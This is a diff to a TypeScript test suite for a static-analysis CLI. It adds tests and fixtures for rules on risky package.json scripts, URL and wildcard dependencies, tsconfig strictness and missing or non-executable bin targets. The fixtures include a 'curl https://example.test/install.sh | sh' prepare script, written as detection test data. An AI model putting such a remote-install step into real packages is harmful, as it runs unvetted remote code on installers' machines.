@@ -1,7 +1,7 @@
 import assert from "node:assert/strict";
-import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
+import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
-import { join } from "node:path";
+import { dirname, join } from "node:path";
 import { chdir, cwd } from "node:process";
 import test from "node:test";
 import { analyse, renderReport } from "./cli.ts";
@@ -12,11 +12,16 @@ const expandedRuleIds = new Set([
   "docs.missing-return-tag",
   "docs.stale-param-tag",
   "docs.useless-docblock",
+  "design.package-bin-missing",
+  "design.package-bin-not-executable",
   "modernisation.double-cast",
   "modernisation.nullish-coalescing-candidate",
   "modernisation.non-null-assertion",
   "modernisation.optional-chaining-candidate",
   "modernisation.readonly-property-candidate",
+  "modernisation.tsconfig-exact-optional-disabled",
+  "modernisation.tsconfig-index-safety-disabled",
+  "modernisation.tsconfig-strict-disabled",
   "modernisation.ts-comment-without-rationale",
   "naming.boolean-prefix",
   "naming.class-file-mismatch",
@@ -27,9 +32,11 @@ const expandedRuleIds = new Set([
   "security.floating-promise",
   "security.insecure-random",
   "security.new-function",
+  "security.remote-install-script",
   "security.sql-concatenation",
   "security.string-timer",
   "security.throw-non-error",
+  "security.url-dependency",
   "security.weak-crypto",
   "sensitive-data.api-key-pattern",
   "sensitive-data.hardcoded-env-value",
@@ -45,6 +52,7 @@ const expandedRuleIds = new Set([
   "waste.commented-out-code",
   "waste.empty-function",
   "waste.exported-any",
+  "waste.broad-runtime-version",
   "waste.redundant-variable",
   "waste.swallowed-catch",
   "waste.unused-import",
@@ -457,6 +465,106 @@ test("extended type-safety config can disable new rules", () => {
     config: { rules: { "modernisation.non-null-assertion": { enabled: false } } },
   });
   assert.equal(disabledReport.findings.some((finding) => finding.ruleId === "modernisation.non-null-assertion"), false);
+});
+
+test("dependency and package config health detects risky package settings", () => {
+  const report = analyseProject({
+    "package.json": JSON.stringify({
+      scripts: {
+        postinstall: "node scripts/setup.js",
+        prepare: "curl https://example.test/install.sh | sh",
+      },
+      dependencies: {
+        "wide-open": "*",
+        "remote-tool": "git+https://github.com/example/remote-tool.git",
+      },
+      devDependencies: {
+        "dev-only": "latest",
+      },
+    }),
+  });
+  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
+  for (const ruleId of ["security.remote-install-script", "security.risky-lifecycle-script", "security.url-dependency", "waste.broad-runtime-version"]) {
+    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
+  }
+
+  const cleanReport = analyseProject({
+    "package.json": JSON.stringify({
+      scripts: { check: "tsc --noEmit", test: "node --test" },
+      dependencies: { commander: "^14.0.2" },
+      devDependencies: { "fixture-tool": "latest" },
+    }),
+  });
+  for (const ruleId of ["security.remote-install-script", "security.risky-lifecycle-script", "security.url-dependency", "waste.broad-runtime-version"]) {
+    assert.equal(cleanReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
+  }
+});
+
+test("package bin health detects missing and non-executable targets", () => {
+  const missingReport = analyseProject({
+    "package.json": JSON.stringify({ bin: { "missing-cli": "./bin/missing.js" } }),
+  });
+  assert.equal(missingReport.findings.some((finding) => finding.ruleId === "design.package-bin-missing"), true);
+
+  const nonExecutableReport = analyseProject({
+    "package.json": JSON.stringify({ bin: { "bad-cli": "./bin/bad.js" } }),
+    "bin/bad.js": "#!/usr/bin/env node\nconsole.log('ok');\n",
+  });
+  assert.equal(nonExecutableReport.findings.some((finding) => finding.ruleId === "design.package-bin-not-executable"), true);
+
+  const noBinReport = analyseProject({
+    "package.json": JSON.stringify({ scripts: { test: "node --test" } }),
+  });
+  assert.equal(noBinReport.findings.some((finding) => finding.ruleId.startsWith("design.package-bin-")), false);
+
+  const executableReport = analyseProject(
+    {
+      "package.json": JSON.stringify({ bin: { "good-cli": "./bin/good.js" } }),
+      "bin/good.js": "#!/usr/bin/env node\nconsole.log('ok');\n",
+    },
+    { executableFiles: ["bin/good.js"] },
+  );
+  assert.equal(executableReport.findings.some((finding) => finding.ruleId.startsWith("design.package-bin-")), false);
+});
+
+test("tsconfig health detects disabled strictness without changing diagnostics", () => {
+  const report = analyseProject({
+    "tsconfig.json": JSON.stringify({
+      compilerOptions: {
+        strict: false,
+        noUncheckedIndexedAccess: false,
+        exactOptionalPropertyTypes: false,
+      },
+    }),
+  });
+  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
+  for (const ruleId of [
+    "modernisation.tsconfig-strict-disabled",
+    "modernisation.tsconfig-index-safety-disabled",
+    "modernisation.tsconfig-exact-optional-disabled",
+  ]) {
+    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
+  }
+
+  const cleanReport = analyseProject({
+    "tsconfig.json": JSON.stringify({
+      compilerOptions: {
+        strict: true,
+        noUncheckedIndexedAccess: true,
+        exactOptionalPropertyTypes: true,
+      },
+    }),
+  });
+  for (const ruleId of [
+    "modernisation.tsconfig-strict-disabled",
+    "modernisation.tsconfig-index-safety-disabled",
+    "modernisation.tsconfig-exact-optional-disabled",
+  ]) {
+    assert.equal(cleanReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
+  }
+
+  const malformedReport = analyseProject({ "package.json": "{ not json" });
+  assert.deepEqual(malformedReport.diagnostics, []);
 });
 
 test("core expansion finds naming and documentation rules", () => {
@@ -951,6 +1059,29 @@ async function unsafe(userInput: string, userId: string, userIds: string[]): Pro
   throw ${JSON.stringify("dynamic failure")};
 }
 
+const packageJsonFixture = ${JSON.stringify(JSON.stringify({
+  scripts: {
+    postinstall: "node scripts/setup.js",
+    prepare: "curl https://example.test/install.sh | sh",
+  },
+  bin: {
+    "missing-cli": "./bin/missing.js",
+    "bad-cli": "./bin/bad.js",
+  },
+  dependencies: {
+    "wide-open": "*",
+    "remote-tool": "git+https://github.com/example/remote-tool.git",
+  },
+}))};
+
+const tsconfigFixture = ${JSON.stringify(JSON.stringify({
+  compilerOptions: {
+    strict: false,
+    noUncheckedIndexedAccess: false,
+    exactOptionalPropertyTypes: false,
+  },
+}))};
+
 /**
  * Scores amount.
  * @param stale Removed parameter.
@@ -1010,6 +1141,28 @@ test("setup bloat", () => {
 OPENAI_API_KEY=sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz1234567890
 PATIENT_SSN=123-45-6789
 `,
+    "package.json": JSON.stringify({
+      scripts: {
+        postinstall: "node scripts/setup.js",
+        prepare: "curl https://example.test/install.sh | sh",
+      },
+      bin: {
+        "missing-cli": "./bin/missing.js",
+        "bad-cli": "./bin/bad.js",
+      },
+      dependencies: {
+        "wide-open": "*",
+        "remote-tool": "git+https://github.com/example/remote-tool.git",
+      },
+    }),
+    "bin/bad.js": "#!/usr/bin/env node\nconsole.log('ok');\n",
+    "tsconfig.json": JSON.stringify({
+      compilerOptions: {
+        strict: false,
+        noUncheckedIndexedAccess: false,
+        exactOptionalPropertyTypes: false,
+      },
+    }),
   });
   const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
   for (const ruleId of expandedRuleIds) {
@@ -1039,6 +1192,7 @@ test("json report uses schema version", () => {
 interface AnalyseProjectOptions {
   config?: Record<string, unknown>;
   configPath?: string;
+  executableFiles?: string[];
   noConfig?: boolean;
 }
 
@@ -1062,7 +1216,12 @@ function analyseProject(files: Record<string, string>, options: AnalyseProjectOp
   const previous = cwd();
   try {
     for (const [fileName, source] of Object.entries(files)) {
-      writeFileSync(join(dir, fileName), source);
+      const path = join(dir, fileName);
+      mkdirSync(dirname(path), { recursive: true });
+      writeFileSync(path, source);
+    }
+    for (const fileName of options.executableFiles ?? []) {
+      chmodSync(join(dir, fileName), 0o755);
     }
     if (options.config) {
       writeFileSync(join(dir, ".gruff.json"), JSON.stringify(options.config));
